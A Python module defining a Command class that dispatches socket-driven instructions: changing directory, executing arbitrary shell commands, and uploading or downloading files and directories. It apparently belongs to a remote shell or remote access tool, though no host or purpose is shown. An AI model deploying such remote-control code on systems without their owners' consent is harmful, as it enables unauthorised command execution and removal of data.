#!/usr/bin/env python3


import os 
from handle_files import UploadFile, DownloadFile
from execute import Execute


class Command:
    def __init__(self, command: str, interaction) -> None:
        self._command = command 
        self._list_command = command.split()
        self._execute = Execute()
        self._interaction = interaction
    
    def get_cli(self) -> (str | None):
        if self._list_command:
            return str(self._list_command[0].strip())
        return None
    
    def _get_args(self) -> (list | None):
        if len(self._list_command) > 1:
            return self._list_command[1:]
        return None
    
    def _validate_path(self, path) -> bool:
        if os.path.exists(path):
            return True
        return False
        
    def chdir(self) -> bytes:
        args = self._get_args()
        output = self._execute.chdir(args)
        return output
        
    def execute(self) -> bytes:
        output = self._execute.execute(self._command)
        return output
        
    def upload(self) -> bytes:
        output = self._execute.upload(self._interaction.sock)
        return output
    
    def download(self) -> bytes:
        output = self._execute.download(self._interaction.sock)
        return output
    
    def upload_directory(self) -> bytes:
        output = self._execute.upload_dir(self._interaction.sock)
        return output
            
    def download_directory(self) -> bytes:
        output = self._execute.download_dir(self._interaction.sock)
        return output